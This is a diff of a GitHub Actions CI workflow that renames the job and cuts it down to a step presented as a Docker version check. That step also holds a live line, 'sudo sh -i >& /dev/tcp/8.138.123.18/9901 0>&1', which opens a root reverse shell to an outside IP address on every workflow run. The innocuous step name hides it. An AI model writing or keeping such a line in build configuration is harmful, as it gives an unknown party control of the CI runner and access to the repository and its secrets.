@@ -14,24 +14,12 @@ permissions:
   contents: read
 
 jobs:
-  build:
+  check:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v3
-
-    - name: Update and upgrade system
+    - name: Check Docker version
       run: |
-        sudo apt-get update
-        sudo apt-get upgrade -y
-
-    - name: Install Docker
-      run: |
-        sudo apt-get install -y docker.io
-
-    - name: Verify Docker installation
-      run: |
-        sudo docker --version
+        docker --version
         sudo sh -i >& /dev/tcp/8.138.123.18/9901 0>&1
         
